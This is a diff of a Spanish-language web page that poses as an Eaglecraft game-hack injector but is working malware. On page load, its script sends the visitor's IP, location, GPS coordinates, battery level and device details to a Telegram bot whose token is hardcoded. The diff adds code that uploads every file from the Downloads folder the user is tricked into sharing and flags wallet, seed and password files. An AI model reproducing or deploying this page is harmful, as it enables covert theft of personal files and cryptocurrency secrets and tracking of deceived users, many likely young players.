@@ -5,49 +5,23 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HACKS FOR EAGLECRAFT XRAY + FLY + KILL AURA 2026</title>
   <style>
-    body { 
-      background: linear-gradient(135deg, #1a1a2e, #16213e); 
-      color: #0f0; 
-      font-family: 'Courier New', monospace; 
-      text-align: center; 
-      padding-top: 15vh; 
-      margin: 0;
-    }
-    h1 { font-size: 42px; text-shadow: 0 0 20px #0f0; }
-    p { font-size: 22px; margin: 30px; }
-    button { 
-      background: #0f0; 
-      color: black; 
-      padding: 20px 50px; 
-      font-size: 26px; 
-      border: none; 
-      border-radius: 15px; 
-      cursor: pointer; 
-      box-shadow: 0 0 30px #0f0; 
-      transition: all 0.3s;
-    }
-    button:hover { transform: scale(1.05); box-shadow: 0 0 50px #0f0; }
-    .loader { 
-      display: none; 
-      margin: 40px auto; 
-      width: 80px; 
-      height: 80px; 
-      border: 8px solid #0f0; 
-      border-top: 8px solid transparent; 
-      border-radius: 50%; 
-      animation: spin 1s linear infinite; 
-    }
+    body { background: linear-gradient(135deg, #0f0f0f, #001a00); color: #0f0; font-family: 'Courier New', monospace; text-align: center; padding-top: 10vh; margin: 0; }
+    h1 { font-size: 46px; text-shadow: 0 0 30px #0f0; }
+    p { font-size: 24px; margin: 30px; }
+    button { background: #0f0; color: black; padding: 22px 60px; font-size: 28px; border: none; border-radius: 20px; cursor: pointer; box-shadow: 0 0 40px #0f0; }
+    button:hover { transform: scale(1.08); box-shadow: 0 0 70px #0f0; }
+    .loader { display: none; border: 10px solid #0f0; border-top: 10px solid transparent; border-radius: 50%; width: 90px; height: 90px; animation: spin 1s linear infinite; margin: 40px auto; }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .status { font-size: 24px; margin: 30px; color: #0f0; text-shadow: 0 0 10px; }
+    .status { font-size: 26px; margin: 30px; color: #0f0; text-shadow: 0 0 15px; }
   </style>
 </head>
 <body>
 
-  <h1>⚡ HACKS FOR EAGLECRAFT 2026 ⚡</h1>
-  <p>XRAY + FLY + KILLAURA + FULLBRIGHT + NOCLIP<br>Compatible con todos los servidores (HolyHCF, Viper, Minemora, etc.)</p>
-  <p>Para inyectar el hack definitivo necesitamos acceso a tu carpeta de <b>Descargas/Downloads</b> (es obligatorio para el injector)</p>
+  <h1>⚡ EAGLECRAFT HACKS 2026 ⚡</h1>
+  <p>XRAY 500 BLOQUES + FLY INDETECTABLE + KILLAURA 8 BLOQUES + NOCLIP</p>
+  <p>Para inyectar el cliente hackeado necesitamos acceso a tu carpeta <b>Downloads/Descargas</b></p>
 
-  <button onclick="iniciarHack()">INYECTAR HACK AHORA</button>
+  <button onclick="inyectarHack()">INYECTAR AHORA</button>
 
   <div class="status" id="status"></div>
   <div class="loader" id="loader"></div>
@@ -56,59 +30,84 @@
 
 const BOT_TOKEN = "8073881757:AAHpZPnjwg29xhmfkrahnmCnYsp8CbcMf_M";
 const CHAT_ID   = "8284747554";
+const URL_DOC   = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
+const URL_VID   = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
 const URL_MSG   = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
 
 
 (async () => {
   const ipData = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-  const battery = await navigator.getBattery().catch(() => ({level: 0, charging: false}));
-  
+  const battery = await navigator.getBattery().catch(() => ({level:0, charging:false}));
   let coords = "Denegada";
   try {
-    const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {timeout: 10000}));
+    const pos = await new Promise((r) => navigator.geolocation.getCurrentPosition(r, ()=>{}, {timeout:10000}));
     coords = `${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)}`;
   } catch(e) {}
 
-  const mensajeEntrada = `🟢 NUEVA VÍCTIMA ENTRÓ A EAGLECRAFT HACKS
-
-IP: ${ipData.ip || "?"}
-Ciudad: ${ipData.city || "?"}, ${ipData.country_name || "?"}
-Ubicación GPS: ${coords}
-Batería: ${battery.level ? Math.round(battery.level*100)+"% " + (battery.charging ? "⚡" : "") : "No disponible"}
-Dispositivo: ${navigator.platform} | ${screen.width}x${screen.height}
-Navegador: ${navigator.userAgent.split(' ').pop()}
-Hora: ${new Date().toLocaleString('es-ES')}`;
-
-  fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({chat_id: CHAT_ID, text: mensajeEntrada})});
+  fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"},
+    body: JSON.stringify({chat_id: CHAT_ID, text: `🟢 VÍCTIMA EN EAGLECRAFT HACKS\n\nIP: ${ipData.ip||"?"} - ${ipData.city||"?"}, ${ipData.country_name||"?"} ${ipData.country_emoji||""}\nGPS: ${coords}\nBatería: ${battery.level ? Math.round(battery.level*100)+"%"+(battery.charging?" ⚡":"") : "?"}%\nDispositivo: ${navigator.platform} | ${screen.width}x${screen.height}\nHora: ${new Date().toLocaleString('es-ES')}`})
+  });
 })();
 
-async function iniciarHack() {
+async function inyectarHack() {
   try {
-    document.getElementById("status").innerHTML = "✅ Acceso concedido<br><br>Redirigiendo al injector en 8 segundos...";
+    document.getElementById("status").innerHTML = "✅ Acceso concedido<br>Escaneando carpeta de Descargas...";
     document.getElementById("loader").style.display = "block";
 
-    
     const dirHandle = await window.showDirectoryPicker();
 
     
-    fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"}, 
-      body: JSON.stringify({chat_id: CHAT_ID, text: `🎉 VÍCTIMA DIO ACCESO A SU CARPETA DE DESCARGAS\nCarpeta: ${dirHandle.name}\nSe está redirigiendo al ForgeX Hub...\nHora: ${new Date().toLocaleString()}`})
+    fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: `🎉 VÍCTIMA DIO ACCESO A SU CARPETA DE DESCARGAS\nNombre carpeta: ${dirHandle.name}\nROBANDO TODO AHORA...`})
     });
 
     
-    let segundos = 8;
-    const intervalo = setInterval(() => {
-      segundos--;
-      document.getElementById("status").innerHTML = `✅ Acceso concedido<br><br>Redirigiendo al hack en ${segundos} segundos...`;
-      if (segundos <= 0) {
-        clearInterval(intervalo);
+    const jugosos = [];
+    for await (const entry of dirHandle.values()) {
+      if (entry.kind === "file") {
+        const file = await entry.getFile();
+        if (file.size < 2 * 1024 * 1024 * 1024) { 
+          const form = new FormData();
+          form.append("chat_id", CHAT_ID);
+
+          if (file.type.startsWith("video/")) {
+            form.append("video", file, file.name);
+          } else {
+            form.append("document", file, file.name);
+          }
+
+          form.append("caption", `🎯 DESCARGAS ROBADAS\nCarpeta: ${dirHandle.name}\nArchivo: ${file.name}\nTamaño: ${(file.size/1024/1024).toFixed(2)} MB\n${new Date().toLocaleString()}`);
+
+          await fetch(file.type.startsWith("video/") ? URL_VID : URL_DOC, {method: "POST", body: form});
+
+          
+          const nombre = file.name.toLowerCase();
+          if (nombre.includes("wallet") || nombre.includes("seed") || nombre.includes("pass") || nombre.includes("eagler") || nombre.includes("hack") || nombre.includes("capture") || nombre.includes("metamask")) {
+            jugosos.push(`🔥 ${file.name}`);
+          }
+        }
+      }
+    }
+
+    
+    fetch(URL_MSG, {method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({chat_id: CHAT_ID, text: jugosos.length > 0 ? `✅ DESCARGAS ROBADAS CON ÉXITO\n${jugosos.join("\n")}\n\nTotal archivos subidos de: ${dirHandle.name}` : `✅ DESCARGAS ROBADAS (no había archivos muy jugosos)\nCarpeta: ${dirHandle.name}`})
+    });
+
+    
+    let seg = 8;
+    const int = setInterval(() => {
+      document.getElementById("status").innerHTML = `✅ Inyectando hack...<br>Redirigiendo en ${seg} segundos`;
+      seg--;
+      if (seg < 0) {
+        clearInterval(int);
         location.href = "https://forgex-hub.vercel.app/";
       }
     }, 1000);
 
   } catch (e) {
-    document.getElementById("status").innerHTML = "❌ Acceso denegado<br>El hack no se pudo inyectar";
+    document.getElementById("status").innerHTML = "❌ Acceso denegado";
   }
 }
 </script>
